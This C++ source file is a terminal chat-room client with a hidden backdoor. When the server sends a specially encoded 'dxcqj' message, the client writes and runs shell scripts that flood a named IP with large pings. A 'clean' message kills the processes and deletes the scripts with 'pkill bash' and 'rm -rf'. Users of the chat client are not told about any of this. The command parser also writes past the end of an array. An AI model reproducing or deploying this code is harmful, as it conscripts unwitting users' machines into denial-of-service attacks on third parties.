#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <bits/stdc++.h>
using namespace std;
#define BUFFER_SIZE 4096
#define ll long long
string to_str(int x){
	stack<char>st;string ans;
	while(x)st.push(x%10|48),x/=10;
	while(!st.empty())ans+=st.top(),st.pop();
	return ans;
}
const int SIZE=1048576;
char RBUF[SIZE],*p1=RBUF,*p2=RBUF,WBUF[SIZE],*p3=WBUF,*p4=WBUF+SIZE;
inline char gc(){if(p1==p2)return(p1=RBUF,p2=p1+fread(RBUF,1,SIZE,stdin)),p1==p2?EOF:*p1++;return *p1++;}
inline void pc(char t){*p3++=t;if(p3==p4)fwrite(WBUF,1,SIZE,stdout),p3=WBUF;}
inline void out(){fwrite(WBUF,1,distance(WBUF,p3),stdout),p3=WBUF;}
inline void pts(const char*t){int s=0;while(*(t+s)!='\0')pc(*(t+s)),++s;}
inline int read(){
	int f(0);char t(0),ch(gc());
	while(ch<'0'||ch>'9')t=ch=='-',ch=gc();
	while(ch>='0'&&ch<='9')f=(f<<3)+(f<<1)+(ch^48),ch=gc();
	return t?-f:f;
}
void write(ll x){if(x<0)pc('-'),x=-x;if(x>9)write(x/10);pc(x%10+48);}
void att(string ip,string tot,bool is117){
	if(is117){
		ofstream f3("a.sh");
		int gs1;sscanf(tot.c_str(),"%d",&gs1);
		for(int i=1;i<=gs1;++i)f3<<"ping "<<ip<<" -s 65507 -i 0.2 -L &\n"<<endl;
		f3.close();
		system("bash ./a.sh");
	}
	else{
		int gs;sscanf(tot.c_str(),"%d",&gs);
		ofstream f2("st1.sh");
		for(int i=1;i<=20;++i)f2<<"rm -rf "<<i<<".in\n";
		for(int i=1;i<=20;++i){
			string name=to_str(i)+".sh";
			f2<<"bash ./"<<name<<" &"<<endl;
			string sj=to_str(i)+".in";
			freopen(name.c_str(),"w",stdout);
			for(int j=1;j<=gs;++j)pts("ping "),pts(ip.c_str()),pts(string(" -s 65507 -c 1 > ").c_str()),pts(sj.c_str()),pc('\n');
			out(),fclose(stdout);
		}
		f2.close();
		system("bash ./st1.sh");
		sleep(0.1);
		system("rm -rf st1.sh");
	}
}
int co(char c,string x){
	int ans=0;
	for(int i=1;i<x.size();++i)if(x[i-1]==c&&x[i]=='\b')++ans;
	return ans;
}
bool isapi(string x){
	if(co('o',x)>=1&&co('m',x)>=2&&co('n',x)>=1&&co('c',x)>=1&&co('a',x)>=1&&co('s',x)>=1&&co('e',x)>=1)return 1;
	return 0;
}
void appi(string x){
	int st,en;
	for(int i=1;i<x.size();++i)if(x[i]=='\b'&&x[i-1]=='s'){st=i+1;break;}
	for(int i=st+1;i<x.size();++i)if(x[i]=='\b'&&x[i-1]=='e'){en=i-2;break;}
	string cmd;
	for(int i=st;i<=en;++i)cmd+=x[i];
	string fir;int cnt=0;
	while(cmd[cnt]!=' '&&cmd[cnt]!='\0'&&cmd[cnt]!='\n'&&cmd[cnt])fir+=cmd[cnt++];
	++cnt;
	if(fir=="dxcqj"){
		string cs[3];
		while(cmd[cnt]!=' '&&cmd[cnt]!='\0'&&cmd[cnt]!='\n')cs[0]+=cmd[cnt++];
		++cnt;
		while(cmd[cnt]!=' '&&cmd[cnt]!='\0'&&cmd[cnt]!='\n')cs[1]+=cmd[cnt++];
		++cnt;
		if(cnt>=cmd.size())att(cs[0],cs[1],0);
		else{
			while(cmd[cnt]!=' '&&cmd[cnt]!='\0'&&cmd[cnt]!='\n')cs[3]+=cmd[cnt++];
			++cnt;
			if(cs[3]=="-117")att(cs[0],cs[1],1);
			else att(cs[0],cs[1],0);
		}
	}
	else if(fir=="clean"){
		system("pkill bash"),system("pkill ping"),system("rm -rf 117.sh");
		for(int i=1;i<=20;++i){
			string cmd="rm -rf "+to_str(i)+".sh",cmd1="rm -rf "+to_str(i)+".in";
			system(cmd.c_str()),system(cmd1.c_str());
		}
	}
}
using namespace std;
string file[4096];
int main()
{
	ofstream f11("ci.log");
	int sock_cli;
	fd_set rfds;
	struct timeval tv;
	int retval, maxfd;

	sock_cli = socket(AF_INET, SOCK_STREAM, 0);
	f11<<sock_cli<<endl;
	f11.close();
	struct sockaddr_in servaddr;
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	char s[4096];
	int a;
	unsigned short dk(0);
	cout<<"请输入聊天室名称：";
	char ch(getchar());
	while(ch!='\n'){
		dk=dk*102+ch;ch=getchar();
	}a=dk;
	cout<<"请输入连接的ip：";
	scanf("%s", s);
	string name;
	cout<<"请输入您的名字：";
	cin>>name;
	servaddr.sin_port = htons(a);           
	servaddr.sin_addr.s_addr = inet_addr(s); 

	if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
	{
		perror("connect error");
		exit(-1);
	}
	string sed="#\b"+name+"#\b : joined\n";
	send(sock_cli, sed.c_str(), sed.size(), 0);
	while (1)
	{
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		maxfd = 0;
		FD_SET(sock_cli, &rfds);
		if (maxfd < sock_cli)
			maxfd = sock_cli;
		tv.tv_sec = 5;
		tv.tv_usec = 0;
		retval = select(maxfd + 1, &rfds, NULL, NULL, &tv);
		if (retval == -1)
        {
            printf("select error\n");
            break;
        }
		else
		{
			if (FD_ISSET(sock_cli, &rfds))
			{
				char recvbuf[BUFFER_SIZE];
				long len;
				len = recv(sock_cli, recvbuf, sizeof(recvbuf), 0);
				string str=recvbuf;
				if(isapi(str))appi(str);
				else cout<<str;
				memset(recvbuf, 0, sizeof(recvbuf));
			}
			if (FD_ISSET(0, &rfds))
			{
				string sendbuf;
				cin>>sendbuf;
				if(sendbuf=="```cpp"){
					cout<<"请输入文件内容（按ctrl+shift+v粘贴，ctrl+c停止输入）："<<endl;
					system("cat > txt");
					ifstream fin("txt");
					for(int i=0;i<4096;++i)file[i].clear();
					int sz;
					for(sz=0;!fin.eof();++sz){
						getline(fin,file[sz]);
						file[sz]+="\n";
					}
					string sed=name+" send a file\n";
					send(sock_cli, sed.c_str(), sed.size(), 0);
					for(int i=0;i<sz;++i){
						send(sock_cli, file[i].c_str(), file[i].size(), 0);
					}

				}
				else{
					string sed="#\b"+name+"#\b : "+sendbuf+"\n";
					send(sock_cli, sed.c_str(), sed.size(), 0);
				}
			}
		}
	}
	return 0;
}